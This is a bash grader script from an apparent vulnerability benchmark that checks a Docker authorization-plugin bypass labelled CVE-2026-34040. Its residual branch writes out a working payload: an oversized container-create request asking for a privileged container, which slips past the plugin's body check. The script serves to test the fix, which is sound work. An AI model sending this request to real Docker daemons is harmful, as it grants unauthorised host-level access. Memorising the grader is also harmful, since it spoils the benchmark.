#!/usr/bin/env bash
# verify.sh (auto-adapted for PCBV2-0146, executor, flag_channel=body)
# 0=效果发生 10=未发生 20=环境失败 30=参数错误
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"
if [[ "$MODE" == "--seed" ]]; then
  # seed（既有行为，已通）：original_poc.py -> cand.json
  "$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" > "$WORK_DIR/cand.json" 2>/dev/null \
    || "$PY" "$CASE_DIR/poc/original_poc.py" > "$WORK_DIR/cand.json" 2>/dev/null
  # flag placeholder replace (file-based)
  "$PY" - "$RUN_FLAG" "$WORK_DIR/cand.json" <<ADAPTEOF
import re, sys
flag, p = sys.argv[1], sys.argv[2]
s = open(p, encoding="utf-8", errors="replace").read()
s = re.sub(r'PCBFLAG_[A-Za-z0-9_]+', flag, s)
open(p, "w").write(s)
ADAPTEOF
  # wrap non-JSON candidate into multi-field dict (file-based)
  "$PY" - "$WORK_DIR/cand.json" <<ADAPTEOF2
import json, sys
p = sys.argv[1]
s = open(p, encoding="utf-8", errors="replace").read().strip().strip(chr(34)).strip(chr(39))
try:
    json.loads(s)
except Exception:
    open(p, "w").write(json.dumps({"path": s, "to": s, "payload": s, "css": s}))
ADAPTEOF2
else
  # residual: CVE-2026-34040（_heldout/bypass_poc.py 语义内嵌，不引用 hidden 文件）。
  # V1(v27.1.1-equivalent) 的 CVE-2024-41110 修复仍以 `r.ContentLength < maxBodySize(1MiB)` 为前提，
  # 且 drainBody 对超限 body 返回 NIL：Content-Length >= 1MiB 的请求插件永远看不到 body -> 默认 ALLOW，
  # 而 daemon 读完整 body 创建特权容器 -> 响应回显 ${PCB_FLAG}。V2(v29.3.1) Peek(maxBodySize+1)
  # 成功即 fail-closed 拒绝 -> 阻断。mode=oversized（真实 Content-Length），pad 字段被 daemon 解码忽略。
  # body 与 bypass_poc 完全一致：{"Privileged":true, "pad":"a"*1300*1024}（~1.3MiB > 1MiB 阈值）。
  "$PY" - "$WORK_DIR/cand.json" <<'PYEOF'
import json, sys
_PAD = "a" * (1300 * 1024)
BODY = json.dumps({"Privileged": True, "pad": _PAD}, separators=(",", ":"))
cand = {
    "probe_id": "cve-2026-34040-oversized-body-authz-bypass",
    "method": "POST",
    "endpoint": "/v1.45/containers/create",
    "content_type": "application/json",
    "mode": "oversized",
    "body": BODY,
}
open(sys.argv[1], "w").write(json.dumps(cand))
PYEOF
fi
# 动态端口导出（compose 已转 PORT_ 动态端口；seed_exec 的 BASE 由 PCB_TARGET_PORT 覆盖）
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
_CP="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
_DYN="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "${_CP:-8080}" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$_DYN" ]] && export PCB_TARGET_PORT="$_DYN"
export PCB_TARGET_PORT="${PCB_TARGET_PORT:-}"

export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"  # poc_common importable
OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
echo "$OUT" | head -c 500; echo
"$PY" -c "import json,sys
try:
    d = json.loads(sys.argv[1])
except Exception:
    sys.exit(20)
body = str(d.get('body') or d.get('fetched_body') or d.get('resp') or d.get('response') or d.get('location') or '')
sys.exit(0 if '$RUN_FLAG' in body else 10)" "$OUT"
